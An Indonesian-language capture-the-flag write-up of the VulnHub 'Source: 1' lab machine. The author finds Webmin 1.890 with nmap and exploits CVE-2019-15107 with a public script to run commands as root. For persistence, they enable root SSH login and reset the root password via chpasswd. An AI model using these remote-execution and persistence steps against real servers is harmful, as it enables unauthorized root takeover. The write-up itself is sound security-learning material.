---
title: "VulnHub Source: 1 Write Up"
pubDate: 2024-09-18
description: "Penulis berhasil menyelesaikan tantangan CTF dengan memanfaatkan kerentanan Webmin untuk mendapatkan akses root dan mengambil flag."
author: "natanhp"
excerpt: "Penulis berhasil menyelesaikan tantangan CTF yang berfokus pada mengeksploitasi akibat dari Supply Chain Attack. Setelah menyiapkan mesin virtual yang rentan, penulis mendapati layanan Webmin yang dapat dieksploitasi. Dengan memanfaatkan exploit yang diketahui, penulis memperoleh akses root ke mesin. Untuk mempertahankan akses, penulis memodifikasi konfigurasi SSH dan mengubah kata sandi root. Akhirnya, penulis berhasil mengambil flag."
image:
  src:
  alt:
tags: ["CTF", "Cyber Security"]
---

Senang sekali rasanya, akhirnya saya bisa punya waktu luang untuk bermain CTF lagi. Kali ini saya mencari mesin di VulnHub yang bisa digunakan untuk mempelajari Suppy Chain Attack (SPA). Saya sedang tertarik dengan metode ini karena peristiwa peledakan pager yang digunakan oleh milisi Hizbullah di Lebanon yang diduga dilakukan oleh Israel. Terlepas dari pembahasan konfliknya, saya ingin berfokus dalam memahami skema penyeranganya, yang nanti juga akan saya tulis di post yang terpisah. Jujur karena sudah lama tidak melakukan pentesting, saya lupa frameworknya jadi harus sambil Googling tahapan-tahapannya. Tapi tak apa, sekalian penyegaran ilmu.

VM dapat didownload di [situs VulnHub]('https://www.vulnhub.com/entry/source-1,514/'). VM ini agak ribet, karena saat dijalankan di VirtualBox hanya akan stuck saat booting dengan black screen dan blinking cursor. Beberapa cara seperti menambah video memory, memory, dan CPU sudah saya lakukan tetapi tetap tidak bisa mengatasi permasalahan. Akhirnya saya harus menginstall VMWare yang kebetulan sekarang untuk personal use dapat digunakan secara gratis. Karena pada distro linux yang saya gunakan belum menyediakan repository VMWare pada package managernya, jadi harus dilakukan instalasi secara manual. Beruntung sekali sudah ada yang membikin tutorialnya, karena cukup ribet jika saya harus cari sendiri dari awal. Jika ada yang menggunakan Fedora 39 bisa dibaca panduannya di [sini]('https://www.if-not-true-then-false.com/2024/fedora-vmware-install/#1-install-vmware-workstation-pro-on-fedora-4039').

## 1. Reconnaissance
Pada tahap ini saya ingin tahu IP address dari mesin. Info yang saya bisa dapatkan adalah bahwa ketika VM ini dipasang, konfigurasi network akan menggunakan NAT. Sehingga untuk mengetahui IP mesin, saya melakukan scanning dari subnet NAT yang didapat dari menu Edit -> Virtual Network Editor.

```bash
natanhp@ngoumah ~ [1]> nmap -sP 192.168.75.0/24
Starting Nmap 7.92 ( https://nmap.org ) at 2024-09-18 17:06 WIB
Nmap scan report for 192.168.75.1 (192.168.75.1)
Host is up (0.00026s latency).
Nmap scan report for 192.168.75.128
Host is up (0.00023s latency).
Nmap done: 256 IP addresses (2 hosts up) scanned in 3.12 seconds
```

Hasil yang didapatkan adalah ada dua host aktif pada range subnet tersebut, yaitu `192.168.75.1` dan `192.168.75.128`. Saya belum tau IP mana yang benar, maka saya mencoba mengidentifikasinya melalui service dan sistem operasi yang digaunakan dari masing-masing IP.

```bash
natanhp@ngoumah ~ [1]> nmap -sV 192.168.75.1
Starting Nmap 7.92 ( https://nmap.org ) at 2024-09-18 17:08 WIB
Nmap scan report for 192.168.75.1 (192.168.75.1)
Host is up (0.00017s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT    STATE SERVICE         VERSION
22/tcp  open  ssh             OpenSSH 9.3 (protocol 2.0)
902/tcp open  ssl/vmware-auth VMware Authentication Daemon 1.10 (Uses VNC, SOAP)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.35 seconds
natanhp@ngoumah ~ [1]> nmap -sV 192.168.75.128
Starting Nmap 7.92 ( https://nmap.org ) at 2024-09-18 17:08 WIB
Nmap scan report for 192.168.75.128
Host is up (0.90s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
10000/tcp open  http    MiniServ 1.890 (Webmin httpd)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.43 seconds
```

Dari hasil tersebut bisa saya simpulkan kalau IP target adalah `192.168.75.128` karena IP yang satunya digunakan oleh VMWare sendiri.

## 2. Scanning and Enumeration
Dari hasil recon, dapat diidentifikasi ada dua service yang terbuka, yaitu SSH dan Webmin. Dari hasil googling, Webmin dengan versi `1.890` memiliki vulnerability yang sudah dipublish dengan nomor [CVE 2019-15107]('https://www.exploit-db.com/exploits/47230'). Dari exploit db tadi sudah disediakan exploit jadinya, tetapi memerlukan Metasploit Framework, beruntung sudah ada exploit yang standalone yang disediakan di [sini]('https://github.com/foxsin34/WebMin-1.890-Exploit-unauthorized-RCE/tree/master').

## 3. Gaining Access
Exploit di atas sudah saya download dan jalankan. Perintah untuk mengetes pertama adalah `whoami` untuk mencari tahu sebagai user apa command dieksekusi.

```bash
natanhp@ngoumah ~/D/w/WebMin-1.890-Exploit-unauthorized-RCE (master) [1]> python webmin-1.890_exploit.py 192.168.75.128 10000 whoami
/home/natanhp/Downloads/wembin/WebMin-1.890-Exploit-unauthorized-RCE/webmin-1.890_exploit.py:6: SyntaxWarning: invalid escape sequence '\_'
  STAIN = """


--------------------------------
   ______________    _____   __
  / ___/_  __/   |  /  _/ | / /
  \__ \ / / / /| |  / //  |/ /
 ___/ // / / ___ |_/ // /|  /
/____//_/ /_/  |_/___/_/ |_/

--------------------------------

WebMin 1.890-expired-remote-root

<h1>Error - Perl execution failed</h1>
<p>Your password has expired, and a new one must be chosen.
root
</p>
```

Ternyata command dieksekusi langsung oleh `root`, sehingga di sini saya tidak perlu lagi melakukan privilege escalation.

## 4. Maintaining Access
Setelah dapat melakukan RCE, langkah selanjutnya yang paling mudah adalah membuat akses ssh, sehingga saya bisa mengakses shell mesin langsung dari terminal saya. Saya mencoba untuk enable autentikasi ssh menggunakan password, dengan cara mengecek config terlebih dahulu.

```bash
natanhp@ngoumah ~/D/w/WebMin-1.890-Exploit-unauthorized-RCE (master) [1]> python webmin-1.890_exploit.py 192.168.75.128 10000 "cat /etc/ssh/sshd_config"
/home/natanhp/Downloads/wembin/WebMin-1.890-Exploit-unauthorized-RCE/webmin-1.890_exploit.py:6: SyntaxWarning: invalid escape sequence '\_'
  STAIN = """


--------------------------------
   ______________    _____   __
  / ___/_  __/   |  /  _/ | / /
  \__ \ / / / /| |  / //  |/ /
 ___/ // / / ___ |_/ // /|  /
/____//_/ /_/  |_/___/_/ |_/

--------------------------------

WebMin 1.890-expired-remote-root

<h1>Error - Perl execution failed</h1>
<p>Your password has expired, and a new one must be chosen.
#	$OpenBSD: sshd_config,v 1.101 2017/03/14 07:19:07 djm Exp $

# This is the sshd server system-wide configuration file.  See
# sshd_config(5) for more information.

# This sshd was compiled with PATH=/usr/bin:/bin:/usr/sbin:/sbin

# The strategy used for options in the default sshd_config shipped with
# OpenSSH is to specify options with their default value where
# possible, but leave them commented.  Uncommented options override the
# default value.

#Port 22
#AddressFamily any
#ListenAddress 0.0.0.0
#ListenAddress ::

#HostKey /etc/ssh/ssh_host_rsa_key
#HostKey /etc/ssh/ssh_host_ecdsa_key
#HostKey /etc/ssh/ssh_host_ed25519_key

# Ciphers and keying
#RekeyLimit default none

# Logging
#SyslogFacility AUTH
#LogLevel INFO

# Authentication:

#LoginGraceTime 2m
#PermitRootLogin prohibit-password
#StrictModes yes
#MaxAuthTries 6
#MaxSessions 10

#PubkeyAuthentication yes

# Expect .ssh/authorized_keys2 to be disregarded by default in future.
#AuthorizedKeysFile	.ssh/authorized_keys .ssh/authorized_keys2

#AuthorizedPrincipalsFile none

#AuthorizedKeysCommand none
#AuthorizedKeysCommandUser nobody

# For this to work you will also need host keys in /etc/ssh/ssh_known_hosts
#HostbasedAuthentication no
# Change to yes if you don't trust ~/.ssh/known_hosts for
# HostbasedAuthentication
#IgnoreUserKnownHosts no
# Don't read the user's ~/.rhosts and ~/.shosts files
#IgnoreRhosts yes

# To disable tunneled clear text passwords, change to no here!
#PasswordAuthentication yes
#PermitEmptyPasswords no

# Change to yes to enable challenge-response passwords (beware issues with
# some PAM modules and threads)
ChallengeResponseAuthentication no

# Kerberos options
#KerberosAuthentication no
#KerberosOrLocalPasswd yes
#KerberosTicketCleanup yes
#KerberosGetAFSToken no

# GSSAPI options
#GSSAPIAuthentication no
#GSSAPICleanupCredentials yes
#GSSAPIStrictAcceptorCheck yes
#GSSAPIKeyExchange no

# Set this to 'yes' to enable PAM authentication, account processing,
# and session processing. If this is enabled, PAM authentication will
# be allowed through the ChallengeResponseAuthentication and
# PasswordAuthentication.  Depending on your PAM configuration,
# PAM authentication via ChallengeResponseAuthentication may bypass
# the setting of "PermitRootLogin without-password".
# If you just want the PAM account and session checks to run without
# PAM authentication, then enable this but set PasswordAuthentication
# and ChallengeResponseAuthentication to 'no'.
UsePAM yes

#AllowAgentForwarding yes
#AllowTcpForwarding yes
#GatewayPorts no
X11Forwarding yes
#X11DisplayOffset 10
#X11UseLocalhost yes
#PermitTTY yes
PrintMotd no
#PrintLastLog yes
#TCPKeepAlive yes
#UseLogin no
#PermitUserEnvironment no
#Compression delayed
#ClientAliveInterval 0
#ClientAliveCountMax 3
#UseDNS no
#PidFile /var/run/sshd.pid
#MaxStartups 10:30:100
#PermitTunnel no
#ChrootDirectory none
#VersionAddendum none

# no default banner path
#Banner none

# Allow client to pass locale environment variables
AcceptEnv LANG LC_*

# override default of no subsystems
Subsystem sftp	/usr/lib/openssh/sftp-server

# Example of overriding settings on a per-user basis
#Match User anoncvs
#	X11Forwarding no
#	AllowTcpForwarding no
#	PermitTTY no
#	ForceCommand cvs server
PasswordAuthentication yes
</p>
```

Di situ ternyata `PasswordAuthentication` sudah diizinkan. Saya hanya tinggal menambahkan `PermitRootLogin yes` agar saya dapat login menggunakan `root` user.

```bash
natanhp@ngoumah ~/D/w/WebMin-1.890-Exploit-unauthorized-RCE (master) [1]> python webmin-1.890_exploit.py 192.168.75.128 10000 "echo \"PermitRootLogin yes\" >> /etc/ssh/sshd_config"
/home/natanhp/Downloads/wembin/WebMin-1.890-Exploit-unauthorized-RCE/webmin-1.890_exploit.py:6: SyntaxWarning: invalid escape sequence '\_'
  STAIN = """


--------------------------------
   ______________    _____   __
  / ___/_  __/   |  /  _/ | / /
  \__ \ / / / /| |  / //  |/ /
 ___/ // / / ___ |_/ // /|  /
/____//_/ /_/  |_/___/_/ |_/

--------------------------------

WebMin 1.890-expired-remote-root

<h1>Error - Perl execution failed</h1>
<p>Your password has expired, and a new one must be chosen.
</p>
natanhp@ngoumah ~/D/w/WebMin-1.890-Exploit-unauthorized-RCE (master) [1]> python webmin-1.890_exploit.py 192.168.75.128 10000 "cat /etc/ssh/sshd_config"
/home/natanhp/Downloads/wembin/WebMin-1.890-Exploit-unauthorized-RCE/webmin-1.890_exploit.py:6: SyntaxWarning: invalid escape sequence '\_'
  STAIN = """


--------------------------------
   ______________    _____   __
  / ___/_  __/   |  /  _/ | / /
  \__ \ / / / /| |  / //  |/ /
 ___/ // / / ___ |_/ // /|  /
/____//_/ /_/  |_/___/_/ |_/

--------------------------------

WebMin 1.890-expired-remote-root

<h1>Error - Perl execution failed</h1>
<p>Your password has expired, and a new one must be chosen.
#	$OpenBSD: sshd_config,v 1.101 2017/03/14 07:19:07 djm Exp $

# This is the sshd server system-wide configuration file.  See
# sshd_config(5) for more information.

# This sshd was compiled with PATH=/usr/bin:/bin:/usr/sbin:/sbin

# The strategy used for options in the default sshd_config shipped with
# OpenSSH is to specify options with their default value where
# possible, but leave them commented.  Uncommented options override the
# default value.

#Port 22
#AddressFamily any
#ListenAddress 0.0.0.0
#ListenAddress ::

#HostKey /etc/ssh/ssh_host_rsa_key
#HostKey /etc/ssh/ssh_host_ecdsa_key
#HostKey /etc/ssh/ssh_host_ed25519_key

# Ciphers and keying
#RekeyLimit default none

# Logging
#SyslogFacility AUTH
#LogLevel INFO

# Authentication:

#LoginGraceTime 2m
#PermitRootLogin prohibit-password
#StrictModes yes
#MaxAuthTries 6
#MaxSessions 10

#PubkeyAuthentication yes

# Expect .ssh/authorized_keys2 to be disregarded by default in future.
#AuthorizedKeysFile	.ssh/authorized_keys .ssh/authorized_keys2

#AuthorizedPrincipalsFile none

#AuthorizedKeysCommand none
#AuthorizedKeysCommandUser nobody

# For this to work you will also need host keys in /etc/ssh/ssh_known_hosts
#HostbasedAuthentication no
# Change to yes if you don't trust ~/.ssh/known_hosts for
# HostbasedAuthentication
#IgnoreUserKnownHosts no
# Don't read the user's ~/.rhosts and ~/.shosts files
#IgnoreRhosts yes

# To disable tunneled clear text passwords, change to no here!
#PasswordAuthentication yes
#PermitEmptyPasswords no

# Change to yes to enable challenge-response passwords (beware issues with
# some PAM modules and threads)
ChallengeResponseAuthentication no

# Kerberos options
#KerberosAuthentication no
#KerberosOrLocalPasswd yes
#KerberosTicketCleanup yes
#KerberosGetAFSToken no

# GSSAPI options
#GSSAPIAuthentication no
#GSSAPICleanupCredentials yes
#GSSAPIStrictAcceptorCheck yes
#GSSAPIKeyExchange no

# Set this to 'yes' to enable PAM authentication, account processing,
# and session processing. If this is enabled, PAM authentication will
# be allowed through the ChallengeResponseAuthentication and
# PasswordAuthentication.  Depending on your PAM configuration,
# PAM authentication via ChallengeResponseAuthentication may bypass
# the setting of "PermitRootLogin without-password".
# If you just want the PAM account and session checks to run without
# PAM authentication, then enable this but set PasswordAuthentication
# and ChallengeResponseAuthentication to 'no'.
UsePAM yes

#AllowAgentForwarding yes
#AllowTcpForwarding yes
#GatewayPorts no
X11Forwarding yes
#X11DisplayOffset 10
#X11UseLocalhost yes
#PermitTTY yes
PrintMotd no
#PrintLastLog yes
#TCPKeepAlive yes
#UseLogin no
#PermitUserEnvironment no
#Compression delayed
#ClientAliveInterval 0
#ClientAliveCountMax 3
#UseDNS no
#PidFile /var/run/sshd.pid
#MaxStartups 10:30:100
#PermitTunnel no
#ChrootDirectory none
#VersionAddendum none

# no default banner path
#Banner none

# Allow client to pass locale environment variables
AcceptEnv LANG LC_*

# override default of no subsystems
Subsystem sftp	/usr/lib/openssh/sftp-server

# Example of overriding settings on a per-user basis
#Match User anoncvs
#	X11Forwarding no
#	AllowTcpForwarding no
#	PermitTTY no
#	ForceCommand cvs server
PasswordAuthentication yes
PermitRootLogin yes
</p>
```

Setelah itu, karena saya tidak tahu apa password untuk `root` user, maka perlu saya ganti passwordnya dan restart ssh service.

```bash
natanhp@ngoumah ~/D/w/WebMin-1.890-Exploit-unauthorized-RCE (master) [1]> python webmin-1.890_exploit.py 192.168.75.128 10000 "echo \"root:toor\" | chpasswd"
/home/natanhp/Downloads/wembin/WebMin-1.890-Exploit-unauthorized-RCE/webmin-1.890_exploit.py:6: SyntaxWarning: invalid escape sequence '\_'
  STAIN = """


--------------------------------
   ______________    _____   __
  / ___/_  __/   |  /  _/ | / /
  \__ \ / / / /| |  / //  |/ /
 ___/ // / / ___ |_/ // /|  /
/____//_/ /_/  |_/___/_/ |_/

--------------------------------

WebMin 1.890-expired-remote-root

<h1>Error - Perl execution failed</h1>
<p>Your password has expired, and a new one must be chosen.
</p>
natanhp@ngoumah ~/D/w/WebMin-1.890-Exploit-unauthorized-RCE (master) [1]> python webmin-1.890_exploit.py 192.168.75.128 10000 "systemctl restart ssh"
/home/natanhp/Downloads/wembin/WebMin-1.890-Exploit-unauthorized-RCE/webmin-1.890_exploit.py:6: SyntaxWarning: invalid escape sequence '\_'
  STAIN = """


--------------------------------
   ______________    _____   __
  / ___/_  __/   |  /  _/ | / /
  \__ \ / / / /| |  / //  |/ /
 ___/ // / / ___ |_/ // /|  /
/____//_/ /_/  |_/___/_/ |_/

--------------------------------

WebMin 1.890-expired-remote-root

<h1>Error - Perl execution failed</h1>
<p>Your password has expired, and a new one must be chosen.
</p>
```

```bash
natanhp@ngoumah ~ [1]> ssh root@192.168.75.128
root@192.168.75.128's password:
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-108-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Sep 18 14:48:26 UTC 2024

  System load:  0.08               Processes:            155
  Usage of /:   22.2% of 18.57GB   Users logged in:      0
  Memory usage: 14%                IP address for ens33: 192.168.75.128
  Swap usage:   0%

  => There is 1 zombie process.

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

264 packages can be updated.
209 updates are security updates.



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

root@source:~# ls
root.txt
root@source:~# cat root.txt
THM{UPDATE_YOUR_INSTALL} 
```

Setelah berhasil melakukan ssh, flag dapat dilihat pada file `root.txt` dengan isi `THM{UPDATE_YOUR_INSTALL}`.
